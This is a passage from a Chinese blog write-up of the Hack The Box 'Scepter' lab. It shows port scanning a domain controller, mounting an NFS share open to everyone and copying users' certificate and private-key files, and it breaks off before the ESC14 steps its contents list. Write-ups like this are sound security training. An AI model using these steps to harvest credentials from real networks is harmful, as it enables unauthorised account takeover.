@@ -1,0 +1,1265 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="靶机总结\r使用了两次esc14，很有意思，本文技术补充以添加至血缇之书\n配置如下\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter] └─$ cat start.sh ip=10.129.103.0 FQDN=DC01.scepter.htb domain=scepter.htb ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter] └─$ cat krb5.conf [libdefaults] dns_lookup_kdc = false dns_lookup_realm = false default_realm = SCEPTER.HTB [realms] SCEPTER.HTB = { kdc = dc01.scepter.htb admin_server = dc01.scepter.htb default_domain = scepter.htb } [domain_realm] .scepter.htb = SCEPTER.HTB scepter.htb = SCEPTER.HTB ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter] └─$ cat hostname 10.129.103.0 DC01.scepter.htb scepter.htb DC01 入口\r并未存在smb和rpc匿名，进行端口扫描\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter] └─$ rustscan -a $ip .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Nmap? More like slowmap.🐢 [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.103.0:53 Open 10.129.103.0:88 Open 10.129.103.0:111 Open 10.129.103.0:135 Open 10.129.103.0:139 Open 10.129.103.0:389 Open 10.129.103.0:445 Open 10.129.103.0:464 Open 10.129.103.0:593 Open 10.129.103.0:636 Open 10.129.103.0:2049 Open 10.129.103.0:3268 Open 10.129.103.0:3269 Open 10.129.103.0:5986 Open 10.129.103.0:5985 Open 10.129.103.0:9389 Open 10.129.103.0:47001 Open 10.129.103.0:49664 Open 10.129.103.0:49667 Open 10.129.103.0:49665 Open 10.129.103.0:49666 Open 10.129.103.0:49671 Open 10.129.103.0:49688 Open 10.129.103.0:49693 Open 10.129.103.0:49689 Open 10.129.103.0:49692 Open 10.129.103.0:49706 Open 10.129.103.0:49720 Open 10.129.103.0:49736 Open 10.129.103.0:49754 [~] Starting Script(s) 开放nfs端口，查看是否存在未授权\n">
+<title>scepter-wp</title>
+
+<link rel='canonical' href='http://localhost:1313/post/scepter/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="scepter-wp">
+<meta property='og:description' content="靶机总结\r使用了两次esc14，很有意思，本文技术补充以添加至血缇之书\n配置如下\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter] └─$ cat start.sh ip=10.129.103.0 FQDN=DC01.scepter.htb domain=scepter.htb ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter] └─$ cat krb5.conf [libdefaults] dns_lookup_kdc = false dns_lookup_realm = false default_realm = SCEPTER.HTB [realms] SCEPTER.HTB = { kdc = dc01.scepter.htb admin_server = dc01.scepter.htb default_domain = scepter.htb } [domain_realm] .scepter.htb = SCEPTER.HTB scepter.htb = SCEPTER.HTB ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter] └─$ cat hostname 10.129.103.0 DC01.scepter.htb scepter.htb DC01 入口\r并未存在smb和rpc匿名，进行端口扫描\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter] └─$ rustscan -a $ip .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Nmap? More like slowmap.🐢 [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.103.0:53 Open 10.129.103.0:88 Open 10.129.103.0:111 Open 10.129.103.0:135 Open 10.129.103.0:139 Open 10.129.103.0:389 Open 10.129.103.0:445 Open 10.129.103.0:464 Open 10.129.103.0:593 Open 10.129.103.0:636 Open 10.129.103.0:2049 Open 10.129.103.0:3268 Open 10.129.103.0:3269 Open 10.129.103.0:5986 Open 10.129.103.0:5985 Open 10.129.103.0:9389 Open 10.129.103.0:47001 Open 10.129.103.0:49664 Open 10.129.103.0:49667 Open 10.129.103.0:49665 Open 10.129.103.0:49666 Open 10.129.103.0:49671 Open 10.129.103.0:49688 Open 10.129.103.0:49693 Open 10.129.103.0:49689 Open 10.129.103.0:49692 Open 10.129.103.0:49706 Open 10.129.103.0:49720 Open 10.129.103.0:49736 Open 10.129.103.0:49754 [~] Starting Script(s) 开放nfs端口，查看是否存在未授权\n">
+<meta property='og:url' content='http://localhost:1313/post/scepter/'>
+<meta property='og:site_name' content='wackymaker'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='htb' /><meta property='article:tag' content='domain' /><meta property='article:published_time' content='2025-09-01T20:56:42&#43;08:00'/><meta property='article:modified_time' content='2025-09-01T20:56:42&#43;08:00'/>
+<meta name="twitter:title" content="scepter-wp">
+<meta name="twitter:description" content="靶机总结\r使用了两次esc14，很有意思，本文技术补充以添加至血缇之书\n配置如下\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter] └─$ cat start.sh ip=10.129.103.0 FQDN=DC01.scepter.htb domain=scepter.htb ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter] └─$ cat krb5.conf [libdefaults] dns_lookup_kdc = false dns_lookup_realm = false default_realm = SCEPTER.HTB [realms] SCEPTER.HTB = { kdc = dc01.scepter.htb admin_server = dc01.scepter.htb default_domain = scepter.htb } [domain_realm] .scepter.htb = SCEPTER.HTB scepter.htb = SCEPTER.HTB ┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter] └─$ cat hostname 10.129.103.0 DC01.scepter.htb scepter.htb DC01 入口\r并未存在smb和rpc匿名，进行端口扫描\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/scepter] └─$ rustscan -a $ip .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Nmap? More like slowmap.🐢 [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.103.0:53 Open 10.129.103.0:88 Open 10.129.103.0:111 Open 10.129.103.0:135 Open 10.129.103.0:139 Open 10.129.103.0:389 Open 10.129.103.0:445 Open 10.129.103.0:464 Open 10.129.103.0:593 Open 10.129.103.0:636 Open 10.129.103.0:2049 Open 10.129.103.0:3268 Open 10.129.103.0:3269 Open 10.129.103.0:5986 Open 10.129.103.0:5985 Open 10.129.103.0:9389 Open 10.129.103.0:47001 Open 10.129.103.0:49664 Open 10.129.103.0:49667 Open 10.129.103.0:49665 Open 10.129.103.0:49666 Open 10.129.103.0:49671 Open 10.129.103.0:49688 Open 10.129.103.0:49693 Open 10.129.103.0:49689 Open 10.129.103.0:49692 Open 10.129.103.0:49706 Open 10.129.103.0:49720 Open 10.129.103.0:49736 Open 10.129.103.0:49754 [~] Starting Script(s) 开放nfs端口，查看是否存在未授权\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_6baab66dae07af16.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">wackymaker</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/wackymaker'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#靶机总结">靶机总结</a></li>
+    <li><a href="#入口">入口</a></li>
+    <li><a href="#esc14">ESC14</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/wp/" >
+                Wp
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/scepter/">scepter-wp</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 01, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    14 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="靶机总结">靶机总结
+</h2><p>使用了两次esc14，很有意思，本文技术补充以添加至血缇之书</p>
+<p>配置如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat start.sh 
+</span></span><span style="display:flex;"><span>ip<span style="color:#f92672">=</span>10.129.103.0
+</span></span><span style="display:flex;"><span>FQDN<span style="color:#f92672">=</span>DC01.scepter.htb
+</span></span><span style="display:flex;"><span>domain<span style="color:#f92672">=</span>scepter.htb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat krb5.conf 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>libdefaults<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    dns_lookup_kdc <span style="color:#f92672">=</span> false
+</span></span><span style="display:flex;"><span>    dns_lookup_realm <span style="color:#f92672">=</span> false
+</span></span><span style="display:flex;"><span>    default_realm <span style="color:#f92672">=</span> SCEPTER.HTB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>realms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    SCEPTER.HTB <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        kdc <span style="color:#f92672">=</span> dc01.scepter.htb
+</span></span><span style="display:flex;"><span>        admin_server <span style="color:#f92672">=</span> dc01.scepter.htb
+</span></span><span style="display:flex;"><span>        default_domain <span style="color:#f92672">=</span> scepter.htb
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>domain_realm<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    .scepter.htb <span style="color:#f92672">=</span> SCEPTER.HTB
+</span></span><span style="display:flex;"><span>    scepter.htb <span style="color:#f92672">=</span> SCEPTER.HTB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat hostname 
+</span></span><span style="display:flex;"><span>10.129.103.0     DC01.scepter.htb scepter.htb DC01
+</span></span></code></pre></div><h2 id="入口">入口
+</h2><p>并未存在smb和rpc匿名，进行端口扫描</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ rustscan -a $ip
+</span></span><span style="display:flex;"><span>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span style="display:flex;"><span>| <span style="color:#f92672">{}</span>  <span style="color:#f92672">}</span>| <span style="color:#f92672">{</span> <span style="color:#f92672">}</span> |<span style="color:#f92672">{</span> <span style="color:#f92672">{</span>__ <span style="color:#f92672">{</span>_   _<span style="color:#f92672">}{</span> <span style="color:#f92672">{</span>__  /  ___<span style="color:#f92672">}</span> / <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\ </span>|  <span style="color:#e6db74">`</span>| |
+</span></span><span style="display:flex;"><span>| .-. <span style="color:#ae81ff">\|</span> <span style="color:#f92672">{</span>_<span style="color:#f92672">}</span> |.-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span> | |  .-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span><span style="color:#ae81ff">\ </span>    <span style="color:#f92672">}</span>/  /<span style="color:#ae81ff">\ </span> <span style="color:#ae81ff">\|</span> |<span style="color:#ae81ff">\ </span> |
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39; `-&#39;</span><span style="color:#e6db74">`</span>-----<span style="color:#e6db74">&#39;`----&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;  `----&#39;</span>  <span style="color:#e6db74">`</span>---<span style="color:#e6db74">&#39; `-&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;`-&#39;</span> <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Modern Day Port Scanner.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">________________________________________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: http://discord.skerritt.blog         :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: https://github.com/RustScan/RustScan :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> --------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap? More like slowmap.🐢
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] Your file limit is very small, which negatively impacts RustScan&#39;</span>s speed. Use the Docker image, or up the Ulimit with <span style="color:#e6db74">&#39;--ulimit 5000&#39;</span>. 
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:53
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:88
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:111
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:135
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:139
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:389
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:445
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:464
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:593
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:636
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:2049
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:3268
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:3269
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:5986
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:5985
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:9389
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:47001
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:49664
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:49667
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:49665
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:49666
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:49671
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:49688
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:49693
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:49689
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:49692
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:49706
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:49720
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:49736
+</span></span><span style="display:flex;"><span>Open 10.129.103.0:49754
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>~<span style="color:#f92672">]</span> Starting Script<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>开放nfs端口，查看是否存在未授权</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ showmount -e $ip
+</span></span><span style="display:flex;"><span>Export list <span style="color:#66d9ef">for</span> 10.129.103.0:
+</span></span><span style="display:flex;"><span>/helpdesk <span style="color:#f92672">(</span>everyone<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>挂载后，发现是4个用户的证书</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo mount -t nfs $ip:/helpdesk ./test
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cd test/
+</span></span><span style="display:flex;"><span>-bash: cd: test/: Permission denied
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ su root
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/wackymaker/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# cd test                         
+</span></span><span style="display:flex;"><span>                                                                                                                                                     
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/tmp/hackthebox/scepter/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# dir
+</span></span><span style="display:flex;"><span>baker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx
+</span></span><span style="display:flex;"><span>                                                        
+</span></span></code></pre></div><p>抓取到本地，修正权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/tmp/hackthebox/scepter/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# cp * ../                                                                    
+</span></span><span style="display:flex;"><span>                                                                                                                                                     
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/…/tmp/hackthebox/scepter/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# cd ../ 
+</span></span><span style="display:flex;"><span>                                                                                                                                                     
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/wackymaker/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# su wackymaker                                                           
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ chmod <span style="color:#ae81ff">777</span> *
+</span></span><span style="display:flex;"><span>chmod: changing permissions of <span style="color:#e6db74">&#39;baker.crt&#39;</span>: Operation not permitted
+</span></span><span style="display:flex;"><span>chmod: changing permissions of <span style="color:#e6db74">&#39;baker.key&#39;</span>: Operation not permitted
+</span></span><span style="display:flex;"><span>chmod: changing permissions of <span style="color:#e6db74">&#39;clark.pfx&#39;</span>: Operation not permitted
+</span></span><span style="display:flex;"><span>chmod: changing permissions of <span style="color:#e6db74">&#39;lewis.pfx&#39;</span>: Operation not permitted
+</span></span><span style="display:flex;"><span>chmod: changing permissions of <span style="color:#e6db74">&#39;scott.pfx&#39;</span>: Operation not permitted
+</span></span><span style="display:flex;"><span>chmod: changing permissions of <span style="color:#e6db74">&#39;test&#39;</span>: Permission denied
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/scepter<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo chmod <span style="color:#ae81ff">777</span> *
+</span></span><span style="display:flex;"><span>chmod: changing permissions of <span style="color:#e6db74">&#39;test&#39;</span>: Permission denied
